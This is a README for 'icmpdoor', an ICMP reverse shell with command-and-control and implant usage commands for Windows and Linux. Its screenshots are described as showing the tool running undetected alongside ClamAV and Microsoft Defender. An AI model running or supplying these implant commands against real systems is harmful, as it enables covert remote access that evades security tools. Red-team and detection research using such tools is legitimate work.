# icmpdoor - ICMP Reverse Shell
ICMP reverse shell written in Python3 and scapy. Tested on Ubuntu 20.04, Debian 10 (Kali Linux), and Windows 10. 

Read [this article](https://cryptsus.com/blog/icmp-reverse-shell.html) for more information.

Python version usage (both Windows and Linux):
```bash
./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command and Control)
./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
```

Binary Windows version usage version:
```bash
./icmp-cnc.exe -d DESTINATION_IP (Command and Control)
./icmpdoor.exe -d DESTINATION_IP (Implant)
```

Binary Linux version usage version:
```bash
./icmp-cnc -d DESTINATION_IP (Command and Control)
./icmpdoor -d DESTINATION_IP (Implant)
```

Parameters details:
```bash
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Listener (virtual) Network Interface (e.g. eth0)
  -d DESTINATION_IP, --destination_ip DESTINATION_IP
                        Destination IP address
  ```
# Screenshots
Screenshot 1 and 2 shows how icmpdoor works on Ubuntu 20.04, Debian 10 (Kali Linux) and Windows 10. ClamAV is active on Ubuntu 20.04:
![screen1](https://cryptsus.com/blog/icmp-reverse-shell-linux.jpg)
Microsoft Defender Advanced Threat Protection is active on the Windows 10 Enterprise machine:
![screen2](https://cryptsus.com/blog/icmp-reverse-shell-windows.jpg)

# License
Berkeley Software Distribution (BSD)

# Author
[Jeroen van Kessel](https://twitter.com/jeroenvkessel) | [cryptsus.com](https://cryptsus.com) - we craft cyber security solutions
